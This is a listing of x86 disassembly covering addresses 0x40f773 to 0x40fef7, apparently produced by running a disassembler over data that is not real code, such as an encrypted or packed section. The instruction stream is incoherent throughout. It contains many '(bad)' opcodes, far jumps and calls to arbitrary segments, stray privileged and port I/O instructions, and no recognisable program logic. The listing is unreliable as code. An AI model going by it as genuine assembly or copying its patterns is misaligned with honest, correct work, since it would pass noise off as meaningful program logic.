  40f773:	mov    cs,WORD PTR ds:0xfa520686
  40f779:	mov    ebx,0x7225c591
  40f77e:	iret   
  40f77f:	pop    DWORD PTR [esi]
  40f781:	and    eax,0x9213341e
  40f786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f787:	mov    ch,0x9e
  40f789:	hlt    
  40f78a:	and    DWORD PTR [ecx],ebp
  40f78c:	popf   
  40f78d:	leave  
  40f78e:	ins    DWORD PTR es:[edi],dx
  40f78f:	add    eax,0x93f0aa44
  40f794:	jmp    0x8e69c4d
  40f799:	mov    ecx,0xa14fbeb6
  40f79e:	ja     0x40f734
  40f7a0:	cmp    eax,0x85c6baa3
  40f7a5:	hlt    
  40f7a6:	pop    es
  40f7a7:	test   eax,0xdef598c5
  40f7ac:	jo     0x40f736
  40f7ae:	mov    esi,0x1be50384
  40f7b3:	sti    
  40f7b4:	mov    es,WORD PTR [ebx]
  40f7b6:	daa    
  40f7b7:	pcmpeqd mm2,mm2
  40f7ba:	daa    
  40f7bb:	(bad)  
  40f7bd:	or     dh,ch
  40f7bf:	adc    ebp,DWORD PTR [ebx-0x5017cf64]
  40f7c5:	lods   eax,DWORD PTR ds:[esi]
  40f7c6:	mov    bl,0x75
  40f7c8:	mov    eax,0xd0beb159
  40f7cd:	mov    esp,0xa3f2bc5f
  40f7d2:	int    0xaa
  40f7d4:	ins    DWORD PTR es:[edi],dx
  40f7d5:	jae    0x40f7d6
  40f7d7:	cmc    
  40f7d8:	push   esp
  40f7d9:	sbb    BYTE PTR ds:0xb87fe2f6,ch
  40f7df:	cmp    cl,BYTE PTR [eax+0x62125448]
  40f7e5:	rcr    DWORD PTR [esi-0x1e14b796],0xbe
  40f7ec:	std    
  40f7ed:	cmp    DWORD PTR [ebx+0x2e79a354],edx
  40f7f3:	call   0x50b44271
  40f7f8:	outs   dx,BYTE PTR ds:[esi]
  40f7f9:	jae    0x40f81c
  40f7fb:	dec    esi
  40f7fc:	dec    ebx
  40f7fd:	xor    BYTE PTR [edx+esi*2-0x11],al
  40f801:	and    DWORD PTR [eax-0x761db58f],ebx
  40f807:	mov    ebp,0x621bd123
  40f80c:	pop    ebp
  40f80d:	outs   dx,BYTE PTR ds:[esi]
  40f80e:	cmp    ecx,DWORD PTR [eax+0x122f378f]
  40f814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f815:	push   DWORD PTR [eax]
  40f817:	call   0x423a9e
  40f81c:	jmp    0x40fd27
  40f821:	ds ret 
  40f823:	enter  0xd13c,0xd3
  40f827:	rol    cl,cl
  40f829:	pop    ebx
  40f82a:	xor    ebp,DWORD PTR [edi+ebx*4-0x5d615f4b]
  40f831:	push   edx
  40f832:	pop    ebx
  40f833:	js     0x40f8ad
  40f835:	push   0x7c
  40f837:	js     0x40f8b1
  40f839:	lock int 0xc0
  40f83c:	mov    ah,0x3e
  40f83e:	jb     0x40f8b6
  40f840:	jmp    0xea2f3d59
  40f845:	sahf   
  40f846:	pusha  
  40f847:	clc    
  40f848:	sbb    dl,cl
  40f84a:	adc    al,BYTE PTR [edi]
  40f84c:	stos   BYTE PTR es:[edi],al
  40f84d:	into   
  40f84e:	imul   edi,DWORD PTR [eax-0x5419397],0x4df0b4e2
  40f858:	dec    ebp
  40f859:	out    dx,eax
  40f85a:	pop    esp
  40f85b:	fsubrp st(0),st
  40f85d:	lahf   
  40f85e:	add    eax,0xf5a036ef
  40f863:	cli    
  40f864:	test   DWORD PTR [ecx],ecx
  40f866:	fmul   DWORD PTR [ecx-0x7d]
  40f869:	test   al,0x4c
  40f86b:	mov    esi,DWORD PTR [ecx-0x711d4e88]
  40f871:	jl     0x40f83b
  40f873:	or     al,BYTE PTR [esi]
  40f875:	push   es
  40f876:	iret   
  40f877:	ret    
  40f878:	add    al,0x9a
  40f87a:	adc    cl,dh
  40f87c:	cmp    ah,BYTE PTR [esi]
  40f87e:	jno    0x40f819
  40f880:	daa    
  40f881:	inc    edx
  40f882:	push   ecx
  40f883:	mov    esi,0x73c28ea0
  40f888:	sub    eax,0x694ea4b5
  40f88d:	fbld   TBYTE PTR [esi]
  40f88f:	leave  
  40f890:	lods   eax,DWORD PTR ds:[esi]
  40f891:	repz xchg ebp,eax
  40f893:	outs   dx,BYTE PTR ds:[si]
  40f895:	sub    DWORD PTR [eax-0x2e],edx
  40f898:	(bad)  
  40f899:	rcr    al,cl
  40f89b:	sub    ebx,DWORD PTR [ebp-0x4f685217]
  40f8a1:	enter  0x3957,0x79
  40f8a5:	push   0xffffffe2
  40f8a7:	loope  0x40f8b0
  40f8a9:	ret    0x28df
  40f8ac:	stc    
  40f8ad:	sub    DWORD PTR [edx+esi*4+0x6],ecx
  40f8b1:	sbb    DWORD PTR [ebx-0x48f1c71b],edx
  40f8b7:	sar    edx,cl
  40f8b9:	es jp  0x40f914
  40f8bc:	dec    ebp
  40f8bd:	sti    
  40f8be:	dec    esi
  40f8bf:	mov    ecx,0x7f388790
  40f8c4:	ret    
  40f8c5:	mov    ds:0xde96ec19,eax
  40f8ca:	pop    es
  40f8cb:	ins    BYTE PTR es:[edi],dx
  40f8cc:	fdiv   DWORD PTR es:[ebx+ebp*4]
  40f8d0:	aaa    
  40f8d1:	call   FWORD PTR [ebx+0x7abd6c3f]
  40f8d7:	pop    esp
  40f8d8:	inc    ebx
  40f8d9:	sbb    DWORD PTR [ebp-0x78c610f7],eax
  40f8df:	xchg   ebp,eax
  40f8e0:	pop    ebx
  40f8e1:	adc    BYTE PTR [ebx+0x35b0bfda],0x5f
  40f8e8:	mov    WORD PTR [ebp-0x4ebe0772],ds
  40f8ee:	inc    edi
  40f8ef:	sub    esi,DWORD PTR [esi+0x5b41d1]
  40f8f5:	out    dx,eax
  40f8f6:	loope  0x40f88b
  40f8f8:	lock or al,0xed
  40f8fb:	sbb    al,0x3c
  40f8fd:	imul   ebp,DWORD PTR [ebx+0x1ff3e812],0xe28a4249
  40f907:	cmp    DWORD PTR [eiz*8-0x594338fe],ebx
  40f90e:	inc    ebx
  40f90f:	jbe    0x40f8bd
  40f911:	push   0x4871a563
  40f916:	outs   dx,BYTE PTR ds:[esi]
  40f917:	adc    DWORD PTR [esi-0x517eea88],esi
  40f91d:	(bad)  [ecx]
  40f91f:	stos   DWORD PTR es:[edi],eax
  40f920:	imul   esi,DWORD PTR [ebx-0x296c3209],0xffffffa6
  40f927:	dec    esp
  40f928:	call   0x3890:0xb5720114
  40f92f:	cmp    eax,0xf1f944c
  40f934:	rcl    eax,1
  40f936:	xor    BYTE PTR ds:0x10b31b2c,bl
  40f93c:	inc    ebp
  40f93d:	shr    DWORD PTR [ebx],0xeb
  40f940:	dec    eax
  40f941:	(bad)  
  40f942:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40f944:	out    0x20,al
  40f946:	xor    DWORD PTR [eax-0x4d],eax
  40f949:	mov    WORD PTR [eax],es
  40f94b:	shl    BYTE PTR [edi+0x42a68d79],1
  40f951:	xlat   BYTE PTR ds:[ebx]
  40f952:	inc    ecx
  40f953:	je     0x40f9ac
  40f955:	pushf  
  40f956:	adc    al,0x66
  40f958:	mov    edx,fs
  40f95a:	call   0x910c9401
  40f95f:	enter  0x3813,0x4a
  40f963:	mov    al,ds:0x5aa8e488
  40f968:	popa   
  40f969:	test   eax,0x13c280a5
  40f96e:	(bad)  
  40f96f:	mov    dh,0x4b
  40f971:	int3   
  40f972:	fld    st(5)
  40f974:	pop    edi
  40f975:	sbb    ch,cl
  40f977:	add    ecx,ebp
  40f979:	sbb    dh,bh
  40f97b:	inc    edx
  40f97c:	jno    0x40f92d
  40f97e:	pusha  
  40f97f:	adc    cl,bl
  40f981:	and    DWORD PTR [edi-0x8],ebp
  40f984:	fs dec edi
  40f986:	ins    BYTE PTR es:[edi],dx
  40f987:	xor    al,0x34
  40f989:	mov    al,ds:0xf8e86230
  40f98e:	fwait
  40f98f:	in     eax,dx
  40f990:	xchg   edi,eax
  40f991:	adc    DWORD PTR [edi],ebp
  40f993:	and    ebx,DWORD PTR [ecx+0x1c]
  40f996:	or     edx,DWORD PTR [eax+eiz*2-0x3f]
  40f99a:	or     BYTE PTR [eax],bh
  40f99c:	ss iret 
  40f99e:	sbb    WORD PTR [ecx-0x402b1085],0xee9d
  40f9a7:	pop    edi
  40f9a8:	pop    eax
  40f9a9:	inc    esp
  40f9aa:	xor    cl,bl
  40f9ac:	adc    al,0xaa
  40f9ae:	adc    al,0xb8
  40f9b0:	inc    eax
  40f9b1:	mov    ecx,0x8203b9b1
  40f9b6:	outs   dx,DWORD PTR ds:[esi]
  40f9b7:	out    0x0,eax
  40f9b9:	aad    0xb7
  40f9bb:	xor    eax,0x49fa6913
  40f9c0:	jecxz  0x40f9bc
  40f9c2:	sti    
  40f9c3:	xor    edx,DWORD PTR ds:0x3a3f4ffa
  40f9c9:	stc    
  40f9ca:	lar    ebp,WORD PTR [edi-0x4c1a74f4]
  40f9d1:	xor    al,dl
  40f9d3:	sub    cl,BYTE PTR [ebp-0x75]
  40f9d6:	pop    ecx
  40f9d7:	cmp    cl,0x1e
  40f9da:	fisttp QWORD PTR [edi]
  40f9dc:	cmp    ebx,DWORD PTR [edi-0x29]
  40f9df:	pop    ds
  40f9e0:	jmp    0x40f965
  40f9e2:	and    ch,BYTE PTR [ebp-0x2ee80b77]
  40f9e8:	jmp    0x40f9b3
  40f9ea:	push   cs
  40f9eb:	popf   
  40f9ec:	les    esi,FWORD PTR [eax-0xc]
  40f9ef:	sbb    DWORD PTR [ecx-0x65],ecx
  40f9f2:	iret   
  40f9f3:	adc    ebp,DWORD PTR [eax+0x37]
  40f9f6:	les    edi,FWORD PTR [ebx]
  40f9f8:	rcr    BYTE PTR [eax+0x7a],1
  40f9fb:	fdivrp st(4),st
  40f9fd:	lds    ecx,FWORD PTR [ebp+0x149f6cf1]
  40fa03:	pop    ebp
  40fa04:	jle    0x40f9ff
  40fa06:	add    bh,BYTE PTR [edx-0xf]
  40fa09:	adc    esi,esi
  40fa0b:	outs   dx,BYTE PTR ds:[esi]
  40fa0c:	xor    BYTE PTR [ecx+0x502b0eed],bh
  40fa12:	imul   esi,DWORD PTR [eax+0x48],0xb437fe5b
  40fa19:	test   ebx,0x54875e86
  40fa1f:	cwde   
  40fa20:	jg     0x40f9fc
  40fa22:	sbb    al,0x7f
  40fa24:	std    
  40fa25:	loope  0x40fa2b
  40fa27:	xor    BYTE PTR [ebp+0x2d45cbc5],bl
  40fa2d:	push   edx
  40fa2e:	jnp    0x40f9c1
  40fa30:	ja     0x40f9d5
  40fa32:	icebp  
  40fa33:	xchg   edx,eax
  40fa34:	adc    eax,DWORD PTR [esi-0x2957e455]
  40fa3a:	jno    0x40fa14
  40fa3c:	sbb    ebx,DWORD PTR [ebx]
  40fa3e:	shr    ebx,1
  40fa40:	outs   dx,DWORD PTR ds:[esi]
  40fa41:	mov    bh,dh
  40fa43:	xor    edi,DWORD PTR [edx]
  40fa45:	enter  0x9f96,0xd1
  40fa49:	cmp    DWORD PTR [esi],edx
  40fa4b:	(bad)  [ebp-0x293e55b1]
  40fa51:	xchg   esp,eax
  40fa52:	mov    dh,0x70
  40fa54:	xchg   esp,eax
  40fa55:	adc    esp,DWORD PTR [ecx+edx*2-0x1839b41a]
  40fa5c:	sbb    BYTE PTR [ebp+0x27],ah
  40fa5f:	(bad)  
  40fa60:	mov    cl,0xbb
  40fa62:	cmp    eax,0xf0e93fab
  40fa67:	lahf   
  40fa68:	ins    BYTE PTR es:[edi],dx
  40fa69:	dec    ebp
  40fa6a:	add    al,0x3f
  40fa6c:	mov    ecx,0x889dfd82
  40fa71:	test   dh,0x4d
  40fa74:	inc    ecx
  40fa75:	jae    0x40fae5
  40fa77:	stos   DWORD PTR es:[edi],eax
  40fa78:	std    
  40fa79:	jmp    0x40fad5
  40fa7b:	in     eax,0xc5
  40fa7d:	push   ss
  40fa7e:	add    al,0x10
  40fa80:	mov    edx,0xc39e49dd
  40fa85:	xlat   BYTE PTR ds:[ebx]
  40fa86:	fidiv  DWORD PTR [edx]
  40fa88:	(bad)  
  40fa89:	push   edx
  40fa8a:	ja     0x40fa2a
  40fa8c:	sbb    eax,0x62826b07
  40fa91:	sbb    dh,BYTE PTR [edi]
  40fa93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa94:	xchg   ecx,eax
  40fa95:	fs inc ecx
  40fa97:	jnp    0x40faf3
  40fa99:	push   cs
  40fa9a:	and    al,BYTE PTR [esi-0x30]
  40fa9d:	adc    eax,0xd44d9159
  40faa2:	loopne 0x40fa24
  40faa4:	xlat   BYTE PTR ds:[ebx]
  40faa5:	add    DWORD PTR [eax+edx*8-0x53],eax
  40faa9:	mov    dl,0x49
  40faab:	and    edi,DWORD PTR [ebp-0x22ce4489]
  40fab1:	mov    ecx,0x7dcf4f60
  40fab6:	jne    0x40fade
  40fab8:	fimul  DWORD PTR [edi]
  40faba:	cs stc 
  40fabc:	outs   dx,BYTE PTR ds:[esi]
  40fabd:	popf   
  40fabe:	leave  
  40fabf:	cli    
  40fac0:	mov    dh,0xa4
  40fac2:	bound  ebx,QWORD PTR [edi*2-0x235daebc]
  40fac9:	in     al,dx
  40faca:	retf   0x2d30
  40facd:	push   edx
  40face:	push   edi
  40facf:	xchg   ecx,eax
  40fad0:	push   0x64
  40fad2:	sar    WORD PTR [eax+0x7e391198],0x4e
  40fada:	inc    esi
  40fadb:	xchg   ebx,eax
  40fadc:	loope  0x40fa7e
  40fade:	sbb    al,BYTE PTR [ebx-0x162f3d30]
  40fae4:	lahf   
  40fae5:	and    BYTE PTR [eax-0x33b88be7],bl
  40faeb:	sbb    BYTE PTR gs:[edi-0x2bd22d4e],0xb4
  40faf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faf4:	std    
  40faf5:	pop    ebp
  40faf6:	faddp  st(7),st
  40faf8:	adc    ah,BYTE PTR [eax-0x862f0b1]
  40fafe:	mov    ch,0x3b
  40fb00:	sub    eax,0xfa895174
  40fb05:	inc    eax
  40fb06:	je     0x40fae5
  40fb08:	inc    ebx
  40fb09:	mov    edi,0xa3e752d6
  40fb0f:	dec    esi
  40fb10:	cli    
  40fb11:	daa    
  40fb12:	add    al,0x1d
  40fb14:	ret    
  40fb15:	or     ebx,DWORD PTR [esi]
  40fb17:	or     bh,cl
  40fb19:	adc    dh,ch
  40fb1b:	in     al,dx
  40fb1c:	or     edi,DWORD PTR [eax+edi*4]
  40fb1f:	xor    eax,0x85342aa1
  40fb24:	cmp    dl,BYTE PTR [edx+0x21378d0]
  40fb2a:	pop    ebp
  40fb2b:	pop    edi
  40fb2c:	adc    ch,dl
  40fb2e:	int3   
  40fb2f:	jge    0x40fae2
  40fb31:	mov    DWORD PTR [eax+ecx*1],ebx
  40fb34:	fild   DWORD PTR ds:0x96abc184
  40fb3a:	fnstsw WORD PTR [edx-0x7a4e99cd]
  40fb40:	rcr    ebx,1
  40fb42:	aam    0x90
  40fb44:	ds stc 
  40fb46:	add    DWORD PTR [ebx],esi
  40fb48:	daa    
  40fb49:	adc    BYTE PTR [edi+ebx*1],bl
  40fb4c:	jmp    0x6d3c95f9
  40fb51:	loope  0x40fbcb
  40fb53:	and    al,0xde
  40fb55:	outs   dx,DWORD PTR ds:[si]
  40fb57:	lock setne BYTE PTR [ebx-0x51d64d99]
  40fb5f:	lahf   
  40fb60:	out    dx,al
  40fb61:	add    edi,DWORD PTR [edx+eiz*4+0x54e0833b]
  40fb68:	inc    ebp
  40fb69:	ret    0x8dbf
  40fb6c:	xchg   ebx,eax
  40fb6d:	popaw  
  40fb6f:	retf   0x96ec
  40fb72:	inc    ebx
  40fb73:	pop    eax
  40fb74:	fst    DWORD PTR [edx-0x6b37f9f9]
  40fb7a:	int3   
  40fb7b:	cwde   
  40fb7c:	xchg   ebp,eax
  40fb7d:	out    0x53,al
  40fb7f:	daa    
  40fb80:	lds    ecx,FWORD PTR [ecx]
  40fb82:	fsubr  st,st(0)
  40fb84:	mov    ?,WORD PTR [ebx+edi*4-0x5c]
  40fb88:	sub    DWORD PTR [edx],eax
  40fb8a:	or     BYTE PTR [esi+0x61],0xdb
  40fb8e:	mov    edx,0x6d8acfaf
  40fb93:	ret    
  40fb94:	inc    edi
  40fb95:	addr16 mov ebx,0x982be2ea
  40fb9b:	xchg   ecx,eax
  40fb9c:	adc    bl,BYTE PTR [edx-0x16]
  40fb9f:	scas   eax,DWORD PTR es:[edi]
  40fba0:	and    esi,ebp
  40fba2:	ja     0x40fb4c
  40fba4:	cs cmp bh,ah
  40fba7:	xor    BYTE PTR [esi-0x6c],ch
  40fbaa:	inc    edx
  40fbab:	xchg   ebp,eax
  40fbac:	push   ecx
  40fbad:	cmp    eax,0xf5fa530b
  40fbb2:	sub    DWORD PTR [edx-0x7549c4f],ebp
  40fbb8:	xchg   edi,eax
  40fbb9:	aad    0x71
  40fbbb:	jmp    0xfe716001
  40fbc0:	in     eax,0xe
  40fbc2:	das    
  40fbc3:	pop    di
  40fbc5:	jb     0x40fb8f
  40fbc7:	jmp    DWORD PTR [ecx-0x6159dda0]
  40fbcd:	jp     0x40fb74
  40fbcf:	mov    esp,0x16282d1d
  40fbd4:	xchg   esp,eax
  40fbd5:	scas   al,BYTE PTR es:[edi]
  40fbd6:	dec    ecx
  40fbd7:	arpl   WORD PTR [edi-0x79],cx
  40fbda:	adc    DWORD PTR [edx-0x5b],ebp
  40fbdd:	dec    ecx
  40fbde:	cwde   
  40fbdf:	call   0x4ee1:0x1f001a7a
  40fbe6:	leave  
  40fbe7:	stos   DWORD PTR es:[edi],eax
  40fbe8:	clc    
  40fbe9:	pop    ebx
  40fbea:	(bad)  
  40fbeb:	xor    ebx,edi
  40fbed:	jmp    0x40fbef
  40fbef:	shr    BYTE PTR [esi-0x78b66bfd],1
  40fbf5:	clc    
  40fbf6:	cdq    
  40fbf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbf8:	xchg   edi,eax
  40fbf9:	ja     0x40fbfd
  40fbfb:	pop    ecx
  40fbfc:	pop    es
  40fbfd:	adc    BYTE PTR [ecx+0x2d55e33e],bh
  40fc03:	or     ah,BYTE PTR [esi]
  40fc05:	das    
  40fc06:	mov    cs,esp
  40fc08:	test   al,0x5a
  40fc0a:	sbb    BYTE PTR [ebp-0xea51891],0xcb
  40fc11:	ror    BYTE PTR [edx-0x459d1fd0],cl
  40fc17:	shl    BYTE PTR [edi],0x4c
  40fc1a:	ret    
  40fc1b:	jge    0x40fc90
  40fc1d:	in     al,0x15
  40fc1f:	xor    eax,0x45db753c
  40fc24:	jmp    0xc211:0x27bb7bd5
  40fc2b:	daa    
  40fc2c:	ret    0xa07
  40fc2f:	leave  
  40fc30:	xor    al,0x91
  40fc32:	leave  
  40fc33:	add    edx,esp
  40fc35:	mov    edx,eax
  40fc37:	dec    esp
  40fc38:	ret    0xfb71
  40fc3b:	jae    0x40fbe8
  40fc3d:	xchg   edi,eax
  40fc3e:	dec    edi
  40fc3f:	jmp    0x3745:0xa88714a2
  40fc46:	jg     0x40fc33
  40fc48:	cdq    
  40fc49:	jns    0x40fbd3
  40fc4b:	call   0xe295:0xa04d00f5
  40fc52:	add    BYTE PTR [edi-0x28097b05],dh
  40fc58:	inc    ecx
  40fc59:	(bad)  [esi+eax*8-0x2d9e25db]
  40fc60:	fsubr  st(6),st
  40fc62:	loopne 0x40fca4
  40fc64:	test   BYTE PTR [edx+0x26188339],ah
  40fc6a:	dec    eax
  40fc6b:	int3   
  40fc6c:	(bad)  
  40fc6d:	xchg   edx,eax
  40fc6e:	mov    BYTE PTR [ecx+0x6bfb0fa7],0xb6
  40fc75:	mov    ds:0xa9462f6b,al
  40fc7a:	(bad)  
  40fc7b:	fnstenv [ebx]
  40fc7d:	cmp    bh,BYTE PTR [ebx]
  40fc7f:	adc    bh,0xff
  40fc82:	(bad)  
  40fc83:	xchg   ecx,eax
  40fc84:	sti    
  40fc85:	loopne 0x40fc31
  40fc87:	lahf   
  40fc88:	inc    ecx
  40fc89:	mov    edi,0x94e73585
  40fc8e:	fnstenv [edi-0x47940165]
  40fc94:	mov    dl,ch
  40fc96:	je     0x40fcbd
  40fc98:	pop    edi
  40fc99:	xchg   ebp,eax
  40fc9a:	pop    edi
  40fc9b:	sar    bl,1
  40fc9d:	cwde   
  40fc9e:	push   0xbaecafba
  40fca3:	mov    dl,0x38
  40fca5:	popf   
  40fca6:	xchg   ecx,eax
  40fca7:	push   ebp
  40fca8:	lea    ebp,[ebx+ebx*2-0x70213702]
  40fcaf:	adc    BYTE PTR [edi+eax*8+0x646328d8],0x5b
  40fcb7:	sub    edx,ecx
  40fcb9:	inc    edx
  40fcba:	sbb    BYTE PTR [ecx+0x346c70ef],bl
  40fcc0:	dec    ecx
  40fcc1:	adc    ebp,DWORD PTR [esi]
  40fcc3:	sub    al,0xcf
  40fcc5:	scas   eax,DWORD PTR es:[edi]
  40fcc6:	test   al,0x6a
  40fcc8:	cwde   
  40fcc9:	xor    eax,0x71473b2c
  40fcce:	repnz ins DWORD PTR es:[edi],dx
  40fcd0:	pop    ds
  40fcd1:	test   eax,0x2eec5de9
  40fcd6:	out    0xc0,eax
  40fcd8:	call   0x8354:0xfd8e4319
  40fcdf:	cdq    
  40fce0:	call   0xa48f:0xa63c18bc
  40fce7:	mov    ebx,0xe61b6d3b
  40fcec:	sbb    BYTE PTR [edx],ch
  40fcee:	mov    WORD PTR [edi-0x23],?
  40fcf1:	cs ins DWORD PTR es:[edi],dx
  40fcf3:	xchg   edx,eax
  40fcf4:	pusha  
  40fcf5:	mov    ds:0x319f142a,al
  40fcfa:	jle    0x40fcac
  40fcfc:	into   
  40fcfd:	hlt    
  40fcfe:	cmp    DWORD PTR [ebp-0x38d6b159],edi
  40fd04:	mov    cl,0xc7
  40fd06:	popf   
  40fd07:	outs   dx,BYTE PTR ds:[esi]
  40fd08:	jecxz  0x40fd52
  40fd0a:	sbb    BYTE PTR cs:[edx+0x47],bh
  40fd0e:	jo     0x40fcdb
  40fd10:	out    dx,al
  40fd11:	xor    dl,BYTE PTR [ebp+0x3b46afec]
  40fd17:	loopne 0x40fd03
  40fd19:	repz mov dh,BYTE PTR [ecx-0x4a53019d]
  40fd20:	mov    eax,0xb8bbad39
  40fd25:	cmp    DWORD PTR [ecx-0x1627b275],0x506
  40fd2f:	int3   
  40fd30:	ds into 
  40fd32:	(bad)  
  40fd33:	rcl    dh,cl
  40fd35:	aam    0xca
  40fd37:	xchg   DWORD PTR [ebx-0x1d],esi
  40fd3a:	fist   WORD PTR [ebx-0x37]
  40fd3d:	arpl   sp,cx
  40fd3f:	mov    esp,0x6a78785e
  40fd44:	jl     0x40fdbe
  40fd46:	js     0x40fce2
  40fd48:	sub    al,0xd0
  40fd4a:	xor    ch,bl
  40fd4c:	nop
  40fd4d:	push   edx
  40fd4e:	jle    0x40fcee
  40fd50:	lea    esi,[eax+0x52d2a2dd]
  40fd56:	and    al,0x6
  40fd58:	mov    eax,0xbc5e2019
  40fd5e:	xor    BYTE PTR [edx+0x1251272],al
  40fd64:	push   0x2d
  40fd66:	xor    eax,0x238421bb
  40fd6b:	dec    ebx
  40fd6c:	leave  
  40fd6d:	mov    cl,0x89
  40fd6f:	aas    
  40fd70:	pop    ss
  40fd71:	mov    ds:0xc4835098,al
  40fd76:	xchg   BYTE PTR [ecx+0x10],dh
  40fd79:	scas   eax,DWORD PTR es:[edi]
  40fd7a:	popa   
  40fd7b:	cmp    BYTE PTR [eax],0xa2
  40fd7e:	out    dx,al
  40fd7f:	popa   
  40fd80:	imul   DWORD PTR [ebp+eiz*8+0xe]
  40fd84:	retf   
  40fd85:	push   ecx
  40fd86:	xor    ebp,DWORD PTR ds:0x631d2060
  40fd8c:	or     ebx,DWORD PTR [esi]
  40fd8e:	sub    ah,BYTE PTR [ecx+0x7b]
  40fd91:	push   ds
  40fd92:	pop    eax
  40fd93:	cli    
  40fd94:	sub    edi,esi
  40fd96:	stc    
  40fd97:	scas   eax,DWORD PTR es:[edi]
  40fd98:	in     eax,0x32
  40fd9a:	mov    cs,WORD PTR [eax-0x2c]
  40fd9d:	jmp    0xa395:0xfc1ecbf0
  40fda4:	mov    ebp,0x51c426f0
  40fda9:	mov    eax,ds:0x8f212e31
  40fdae:	add    BYTE PTR ds:0xd29d21b,0x3f
  40fdb5:	add    eax,0x8df06bf1
  40fdba:	imul   esi,DWORD PTR [ecx-0x4c],0x72f3d296
  40fdc1:	mov    dl,0xff
  40fdc3:	je     0x40fd5d
  40fdc5:	les    ebp,FWORD PTR [ebp-0x27ee66f1]
  40fdcb:	inc    edi
  40fdcc:	arpl   WORD PTR [eax-0x9670659],di
  40fdd2:	adc    BYTE PTR es:[ebx],bh
  40fdd5:	xor    eax,0x98f5e092
  40fdda:	or     al,0x69
  40fddc:	cmp    DWORD PTR [edx],ebp
  40fdde:	mov    ds:0x9dbfcc7d,eax
  40fde3:	sbb    eax,0x57e99fde
  40fde8:	mov    bh,0x21
  40fdea:	(bad)  
  40fdeb:	push   eax
  40fdec:	sbb    eax,0x539bb8a0
  40fdf1:	adc    ecx,esi
  40fdf3:	sub    DWORD PTR ds:0xd1308a31,0xbe10a1d4
  40fdfd:	std    
  40fdfe:	xchg   DWORD PTR [eax-0x40],ecx
  40fe01:	pop    esp
  40fe02:	xchg   esp,eax
  40fe03:	pop    ebp
  40fe04:	pop    ss
  40fe05:	sub    ch,BYTE PTR [ebx]
  40fe07:	jmp    0x40fdf3
  40fe09:	aad    0xbe
  40fe0b:	jne    0x40fe2a
  40fe0d:	pop    ecx
  40fe0e:	jno    0x40fde2
  40fe10:	mov    bl,BYTE PTR [ecx]
  40fe12:	call   0xe0e3:0xe6208686
  40fe19:	outs   dx,BYTE PTR ds:[esi]
  40fe1a:	or     DWORD PTR [eax],edx
  40fe1c:	xchg   esp,eax
  40fe1d:	ds add bh,ch
  40fe20:	clc    
  40fe21:	outs   dx,BYTE PTR ds:[esi]
  40fe22:	aam    0x80
  40fe24:	add    BYTE PTR [edi+0x1d],al
  40fe27:	sbb    al,0xea
  40fe29:	pop    ds
  40fe2a:	add    al,0x15
  40fe2c:	adc    BYTE PTR [esp+edx*1-0x28ff139b],al
  40fe33:	cmc    
  40fe34:	fnstcw WORD PTR [ecx]
  40fe36:	inc    esi
  40fe37:	out    0xab,al
  40fe39:	jb     0x40fe68
  40fe3b:	push   0x18
  40fe3d:	jp     0x40feb5
  40fe3f:	pop    ds
  40fe40:	(bad)  
  40fe42:	test   DWORD PTR [edi-0x53],0x2d38335f
  40fe49:	cs jae 0x40fdeb
  40fe4c:	mov    fs,WORD PTR [ebx]
  40fe4e:	out    0xce,eax
  40fe50:	les    esp,FWORD PTR [eax+eiz*2+0x5ade73ef]
  40fe57:	xchg   DWORD PTR [ebx+0x63],eax
  40fe5a:	inc    esp
  40fe5b:	rcr    DWORD PTR [edi],cl
  40fe5d:	pop    ebp
  40fe5e:	jnp    0x40feb9
  40fe60:	out    dx,al
  40fe61:	int    0xf4
  40fe63:	stc    
  40fe64:	push   ebx
  40fe65:	ror    BYTE PTR [ecx+0x213d7727],0xb6
  40fe6c:	add    esp,DWORD PTR [ecx+0x6a]
  40fe6f:	out    0x60,al
  40fe71:	push   edx
  40fe72:	in     eax,dx
  40fe73:	mov    dl,0x12
  40fe75:	dec    ecx
  40fe76:	dec    ecx
  40fe77:	mov    DWORD PTR [eax],ebx
  40fe79:	add    al,0xa4
  40fe7b:	rcl    ebp,cl
  40fe7d:	je     0x40fe58
  40fe7f:	test   eax,0x7dc59918
  40fe84:	fcom   DWORD PTR [eax+0x6d]
  40fe87:	adc    eax,0x3e0bb595
  40fe8c:	cmp    esp,DWORD PTR [ecx+0x0]
  40fe8f:	or     al,0x8e
  40fe91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe92:	out    dx,al
  40fe93:	sahf   
  40fe94:	leave  
  40fe95:	xor    ah,BYTE PTR [ecx]
  40fe97:	adc    dl,BYTE PTR [esi-0x2d]
  40fe9a:	fnstsw WORD PTR [ebx+0x57aaeb3d]
  40fea0:	cmp    BYTE PTR [esi],cl
  40fea2:	sub    DWORD PTR [edi+0x10],ecx
  40fea5:	push   esi
  40fea6:	lea    edx,[ecx+0x56]
  40fea9:	fisttp WORD PTR [eax+edx*1]
  40feac:	clc    
  40fead:	jnp    0x40fe32
  40feaf:	sbb    al,0xdf
  40feb1:	popf   
  40feb2:	dec    edi
  40feb3:	test   BYTE PTR [edx+0x5ed99d2b],ah
  40feb9:	sti    
  40feba:	cs xchg ebp,eax
  40febc:	pusha  
  40febd:	std    
  40febe:	cwde   
  40febf:	mov    esi,0x1e2db32b
  40fec4:	cdq    
  40fec5:	outs   dx,DWORD PTR ds:[esi]
  40fec6:	pop    ebp
  40fec7:	mov    al,ds:0x29ca0709
  40fecc:	div    eax
  40fece:	lods   al,BYTE PTR ds:[esi]
  40fecf:	(bad)  [edi+ebx*1]
  40fed2:	pop    esi
  40fed3:	inc    ebp
  40fed4:	call   FWORD PTR [ebp-0x7fb149cd]
  40feda:	icebp  
  40fedb:	into   
  40fedc:	mov    ds:0xa0f1f149,eax
  40fee1:	push   esi
  40fee2:	(bad)  
  40fee3:	pop    ebp
  40fee4:	lock sub ebx,eax
  40fee7:	loop   0x40ff35
  40fee9:	stos   BYTE PTR es:[edi],al
  40feea:	mov    dh,cl
  40feec:	cmc    
  40feed:	out    dx,al
  40feee:	add    al,0x8a
  40fef0:	scas   al,BYTE PTR es:[edi]
  40fef1:	xor    al,0x2e
  40fef3:	push   ebp
  40fef4:	jns    0x40fed5
  40fef6:	pop    edi
  40fef7:	in     eax,dx
